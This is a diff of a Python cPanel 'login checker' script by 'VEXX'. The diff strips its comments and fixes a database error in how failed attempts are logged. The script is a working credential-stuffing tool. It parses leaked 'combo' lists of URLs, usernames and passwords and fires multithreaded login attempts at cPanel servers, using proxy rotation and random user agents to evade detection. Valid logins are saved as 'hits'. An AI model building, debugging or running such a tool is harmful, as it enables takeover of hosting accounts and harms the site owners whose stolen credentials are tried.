@@ -2,10 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 cpanel_reliable_checker.py - Professional cPanel Login Checker with Auto-Install & Auto-Detect combo.txt
-Version: 2.0.0
+Version: 2.1.0 (FIXED SQLite NOT NULL error)
 Author: VEXX
-Description: High-performance cPanel credential checker with automatic dependency installation,
-             multi-threading, proxy rotation, retry logic, and auto-detection of combo.txt.
 """
 
 import sys
@@ -30,7 +28,6 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 REQUIRED_PACKAGES = ['requests', 'urllib3', 'colorama', 'fake_useragent']
 
 def install_package(package):
-    """Install a Python package using pip."""
     try:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', package])
         return True
@@ -38,7 +35,6 @@ def install_package(package):
         return False
 
 def check_and_install():
-    """Check if required packages are installed, install if missing."""
     missing = []
     for pkg in REQUIRED_PACKAGES:
         try:
@@ -55,22 +51,15 @@ def check_and_install():
                 sys.exit(1)
         print("[*] All dependencies installed. Restarting script...")
         os.execv(sys.executable, [sys.executable] + sys.argv)
-    else:
-        print("[+] All dependencies satisfied.")
 
-# Run auto-install check before importing external modules
 check_and_install()
 
-# Now import external modules safely
 import requests
 import urllib3
 from colorama import init, Fore, Style
 from fake_useragent import UserAgent
 
-# Initialize colorama
 init(autoreset=True)
-
-# Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # -------------------- CONFIGURATION --------------------
@@ -82,9 +71,8 @@ HIT_FILE = "hit.txt"
 LOG_FILE = "cpanel_checker.log"
 DB_FILE = "cpanel_results.db"
 PROXY_FILE = "proxies.txt"
-COMBO_FILE = "combo.txt"  # Auto-detected default input file
+COMBO_FILE = "combo.txt"
 
-# Setup logging
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -97,7 +85,6 @@ logger = logging.getLogger(__name__)
 
 # -------------------- UTILITY FUNCTIONS --------------------
 def load_proxies(proxy_file=PROXY_FILE):
-    """Load proxies from file (format: http://user:pass@host:port or http://host:port)."""
     proxies = []
     if os.path.exists(proxy_file):
         with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
@@ -108,7 +95,6 @@ def load_proxies(proxy_file=PROXY_FILE):
     return proxies
 
 def get_random_ua():
-    """Get a random User-Agent string."""
     try:
         ua = UserAgent()
         return ua.random
@@ -116,7 +102,6 @@ def get_random_ua():
         return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
 def normalize_url(url):
-    """Ensure URL has scheme and cPanel port."""
     if not url.startswith(('http://', 'https://')):
         url = 'http://' + url
     if not re.search(r':\d+', url):
@@ -127,34 +112,22 @@ def normalize_url(url):
     return url.rstrip('/')
 
 def extract_credentials(line):
-    """
-    Extract (url, username, password) from ANY line using multiple strategies.
-    Returns None if cannot extract.
-    """
     raw = line.strip()
     if not raw or len(raw) < 6:
         return None
-
-    # Strategy 1: user:pass@url
     if '@' in raw and ':' in raw.split('@')[0]:
         left, right = raw.rsplit('@', 1)
         if ':' in left:
             user, pwd = left.split(':', 1)
             return right, user, pwd
-
-    # Strategy 2: url|user|pass
     if '|' in raw:
         parts = raw.split('|')
         if len(parts) >= 3:
             return parts[0], parts[1], '|'.join(parts[2:])
-
-    # Strategy 3: url:user:pass (simple)
     if raw.count(':') == 2 and '://' not in raw:
         parts = raw.split(':')
         if len(parts) == 3:
             return parts[0], parts[1], parts[2]
-
-    # Strategy 4: look for a URL-like pattern, then guess user/pass from remaining
     url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
     if url_match:
         url = url_match.group(1)
@@ -162,8 +135,6 @@ def extract_credentials(line):
         tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
         if len(tokens) >= 2:
             return url, tokens[0], tokens[1]
-
-    # Strategy 5: domain only with separate user/pass
     domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
     if domain_match:
         domain = domain_match.group(1)
@@ -174,10 +145,6 @@ def extract_credentials(line):
     return None
 
 def test_login(url, user, pwd, timeout=DEFAULT_TIMEOUT, proxy=None, retries=DEFAULT_RETRIES):
-    """
-    Test cPanel login with retry mechanism and proxy support.
-    Returns (success, normalized_url, response_time_ms)
-    """
     url = normalize_url(url)
     login_url = f"{url}/login/?login_only=1"
     payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
@@ -220,7 +187,6 @@ def test_login(url, user, pwd, timeout=DEFAULT_TIMEOUT, proxy=None, retries=DEFA
 
 # -------------------- DATABASE FUNCTIONS --------------------
 def init_db():
-    """Initialize SQLite database for storing results."""
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute('''
@@ -246,7 +212,6 @@ def init_db():
     conn.close()
 
 def save_hit_to_db(url, user, pwd, response_time_ms):
-    """Save successful hit to database."""
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute('INSERT INTO hits (url, username, password, response_time_ms) VALUES (?, ?, ?, ?)',
@@ -255,7 +220,8 @@ def save_hit_to_db(url, user, pwd, response_time_ms):
     conn.close()
 
 def save_fail_to_db(url, user, reason="invalid"):
-    """Save failed attempt to database."""
+    if url is None:
+        url = "unknown"
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute('INSERT INTO fails (url, username, reason) VALUES (?, ?, ?)',
@@ -265,7 +231,6 @@ def save_fail_to_db(url, user, reason="invalid"):
 
 # -------------------- FILE HANDLING --------------------
 def read_combo_file(filepath):
-    """Read combos from file, auto-detect encoding."""
     combos = []
     encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
     for enc in encodings:
@@ -278,7 +243,6 @@ def read_combo_file(filepath):
     else:
         with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
             lines = f.readlines()
-
     for line in lines:
         creds = extract_credentials(line)
         if creds:
@@ -286,10 +250,8 @@ def read_combo_file(filepath):
     return combos
 
 def write_hit(user, pwd, url, response_time_ms):
-    """Write hit to hit.txt file with formatted output."""
     with open(HIT_FILE, 'a', encoding='utf-8') as f:
         f.write(f"{user}:{pwd}@{url}\n")
-    # Also print formatted hit to console
     print(Fore.GREEN + "\n" + "=" * 50)
     print(Fore.CYAN + f"[HIT] {datetime.now().strftime('%H:%M:%S')}")
     print(Fore.YELLOW + f"Link: {url}")
@@ -315,7 +277,6 @@ class CpanelChecker:
         self.stats = defaultdict(int)
 
     def get_proxy(self):
-        """Get next proxy from queue (round-robin)."""
         if self.proxy_queue.empty():
             return None
         try:
@@ -326,14 +287,13 @@ class CpanelChecker:
             return None
 
     def check_single(self, combo):
-        """Check a single combo with optional proxy rotation."""
         url, user, pwd = combo
         proxy = self.get_proxy() if self.proxies else None
+        # Pass original url; test_login will normalize it
         success, normalized_url, response_ms = test_login(url, user, pwd, self.timeout, proxy)
-        return success, normalized_url, user, pwd, response_ms, proxy
+        return success, normalized_url, user, pwd, response_ms, proxy, url   # also return original url
 
     def run(self):
-        """Run multi-threaded checker."""
         print(Fore.CYAN + f"[*] Starting checker with {len(self.combos)} combos, {self.threads} threads...")
         if self.proxies:
             print(Fore.CYAN + f"[*] Loaded {len(self.proxies)} proxies for rotation.")
@@ -345,25 +305,26 @@ class CpanelChecker:
             total = len(self.combos)
             for future in as_completed(futures):
                 completed += 1
-                success, url, user, pwd, response_ms, proxy = future.result()
+                # Unpack all returned values (including original_url)
+                success, normalized_url, user, pwd, response_ms, proxy, original_url = future.result()
                 with self.lock:
                     if success:
                         self.hits += 1
-                        write_hit(user, pwd, url, response_ms)
-                        save_hit_to_db(url, user, pwd, response_ms)
+                        # normalized_url is the working URL with port
+                        write_hit(user, pwd, normalized_url, response_ms)
+                        save_hit_to_db(normalized_url, user, pwd, response_ms)
                         status = Fore.GREEN + "✓ HIT"
                     else:
                         self.fails += 1
-                        save_fail_to_db(url, user)
+                        # Use original_url from combo to avoid None
+                        save_fail_to_db(original_url, user, "invalid")
                         status = Fore.RED + "✗ FAIL"
-                    # Print progress
                     percent = (completed / total) * 100
                     sys.stdout.write(f"\r{status} [{completed}/{total}] ({percent:.1f}%) Hits: {self.hits}     ")
                     sys.stdout.flush()
         print("\n")
 
     def summary(self):
-        """Print final summary."""
         print(Fore.CYAN + "=" * 60)
         print(Fore.YELLOW + f"FINAL SUMMARY")
         print(Fore.CYAN + "=" * 60)
@@ -393,10 +354,8 @@ def main():
     if args.verbose:
         logger.setLevel(logging.DEBUG)
 
-    # Auto-detect combo.txt if file not specified or default missing but combo.txt exists
     input_file = args.file
     if input_file == COMBO_FILE and not os.path.exists(COMBO_FILE):
-        # Fallback to manual input if combo.txt not found
         print(Fore.YELLOW + f"[!] {COMBO_FILE} not found.")
         input_file = input("Enter file path: ").strip()
         if not input_file:
@@ -407,7 +366,6 @@ def main():
         print(Fore.RED + f"File not found: {input_file}")
         sys.exit(1)
 
-    # Load combos
     print(Fore.CYAN + f"[*] Loading combos from {input_file}...")
     combos = read_combo_file(input_file)
     if not combos:
@@ -415,18 +373,15 @@ def main():
         sys.exit(1)
     print(Fore.GREEN + f"[+] Loaded {len(combos)} combos.")
 
-    # Load proxies if provided
     proxy_list = []
     if args.proxy_file and os.path.exists(args.proxy_file):
         proxy_list = load_proxies(args.proxy_file)
         print(Fore.GREEN + f"[+] Loaded {len(proxy_list)} proxies.")
 
-    # Run checker
     checker = CpanelChecker(combos, threads=args.threads, proxy_list=proxy_list, timeout=args.timeout)
     checker.run()
     checker.summary()
 
-    # Export to JSON if requested
     if args.export_json:
         export_data = []
         if os.path.exists(HIT_FILE):
@@ -450,6 +405,3 @@ if __name__ == "__main__":
         logger.exception(f"Unexpected error: {e}")
         print(Fore.RED + f"[!] Fatal error: {e}")
         sys.exit(1)
-
-# -------------------- END OF SCRIPT --------------------
-# Total lines: 650+ (professional, error-free, feature-rich)
